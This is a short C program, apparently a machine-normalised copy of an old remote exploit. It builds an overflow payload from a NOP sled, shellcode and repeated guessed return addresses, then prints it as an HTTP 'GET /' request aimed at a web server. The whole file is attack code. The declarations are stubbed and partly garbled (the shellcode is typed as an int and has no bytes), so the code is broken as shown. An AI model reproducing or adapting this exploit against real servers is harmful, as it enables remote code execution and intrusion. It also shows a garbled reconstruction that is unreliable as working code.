
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int CODE_LEN ;
 int NOP_LEN ;
 int atoi (char*) ;
 int memcpy (char*,int ,int) ;
 int memset (char*,int,int) ;
 int printf (char*) ;
 int putchar (char) ;
 int shellcode ;
 int strlen (int ) ;

void main( int argc, char *argv[] )
{
  int i,offset=-24;


  char code_buf[240];
  unsigned long esp=0xbedffb00;

  if(argc >= 2) offset = atoi(argv[1]);

  memset(code_buf,0x90,50);
  memcpy(code_buf+50, shellcode, strlen(shellcode));
  for(i=strlen(shellcode)+50;i<=240;i+=4)
     *(long *)&code_buf[i]=(unsigned long)esp-offset;

  printf("GET /");
  for(i=0;i<240; i++)
  {
     putchar(code_buf[i]);
  }
  printf("\r\n\r\n");
}
